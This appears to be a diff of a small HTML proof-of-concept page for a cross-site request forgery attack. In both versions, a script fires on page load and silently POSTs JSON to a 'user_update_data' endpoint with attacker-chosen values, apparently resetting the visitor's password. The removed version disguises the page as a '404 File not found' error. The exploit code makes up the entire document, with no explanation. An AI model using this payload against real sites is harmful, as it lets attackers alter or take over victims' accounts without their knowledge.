@@ -1,37 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>CSRF</title>
-    <script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js">
-
-    </script>
-    <script type="text/javascript">
-    //发送表单ajax请求
-    window.onload=function() {
-        $.ajax({
-            // url: "http://113.108.70.111:61147/myapp/user_update_data",
-            url: "http://127.0.0.1/myapp/user_update_data",
-            type: "POST",
-            // dataType:"jsonp",
-            data: '{"value1":"01CFCD4F6B8770FEBFB40CB906715822","value2":"01CFCD4F6B8770FEBFB40CB906715822"}',
-            contentType: "application/json",
-            // jsonp:"callbackparam",
-            // jsonpCallback: "success_jsonpCallback",
-        })
-    }
-    </script>
-</head>
-<!--<body>-->
-    <!--<form id="transfer" method="post" action="http://113.108.70.111:60796/myapp/user_update_data">-->
-        <!--<input type="password" value="{{ value1 }}" name="value1" id="value1">-->
-        <!--<input type="password" value="{{ value1 }}" name="value2" id="value2">-->
-        <!--<input id="submitid" value="Login" type="submit" name="submit">-->
-        <!--{% csrf_token %}-->
-    <!--</form>-->
-    <!--<h1>404</h1>-->
-    <!--<h1>File not found.</h1>-->
-<!--</body>-->
-    <h1>404</h1>
-    <h1>File not found.</h1>
+<html>
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<script type="text/javascript">
+        window.onload=function(){
+                $.ajax({
+                        url:"http://127.0.0.1/myapp/user_update_data",
+                        type:"POST",
+                        data:'{"value1":"81dc9bdb52d04dc20036dbd8313ed055","value2":"81dc9bdb52d04dc20036dbd8313ed055"}',
+                        contentType:"application/json"
+                });
+        }
+</script>
 </html>
